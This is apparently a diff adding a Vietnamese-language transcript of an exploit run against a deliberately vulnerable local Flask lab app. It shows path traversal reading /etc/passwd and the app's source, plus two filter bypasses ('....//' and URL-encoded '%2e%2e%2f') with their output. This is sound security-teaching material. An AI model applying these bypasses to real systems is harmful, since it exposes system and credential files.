@@ -1,0 +1,36 @@
+# Transcript lab 7.1 - path traversal / LFI (chay that 2026-10-18 17:18)
+# App: Flask 127.0.0.1:8061 | Exploit: bash exploit.sh
+
+=== [0] Request binh thuong (file hop le) ===
+Chao mung toi DocViewer noi bo.
+
+=== [1] Path traversal doc /etc/passwd qua ../ ===
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+=== [2] Doc source cua chinh app (app.py) de lo cau truc ===
+#!/usr/bin/env python3
+# Lab 7.1 - Path Traversal / LFI (co y de lo hong de hoc)
+# Chay: python3 app.py   (lang nghe 127.0.0.1:8061)
+# App "doc tai lieu" theo tham so file, noi ghep duong dan khong loc -> traversal.
+import os
+from flask import Flask, request, Response
+
+=== [3] Endpoint /safe co loc '../' - request tho bi chan ===
+Loi doc file: [Errno 2] No such file or directory: '/mnt/d/REVERSE_IDA_DNSPY_JADX_PYCDC/TechWeb/labs/7.1/docs/etc/passwd'
+=== [4] Bypass bo loc bang '....//' (strip 1 lan con lai '../') ===
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+=== [5] URL-encode '../' (%2e%2e%2f) cung qua duoc /view ===
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+=== DONE ===
